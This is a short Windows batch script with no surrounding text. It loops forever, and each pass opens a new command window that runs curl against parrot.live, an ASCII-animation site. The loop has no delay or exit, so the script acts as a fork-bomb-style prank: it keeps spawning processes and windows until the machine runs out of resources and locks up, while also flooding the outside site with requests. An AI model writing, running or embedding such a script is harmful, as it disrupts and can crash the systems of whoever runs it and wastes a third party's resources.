@echo off
:loop
start "" "C:\Windows\System32\cmd.exe" /c "curl http://parrot.live"
goto loop
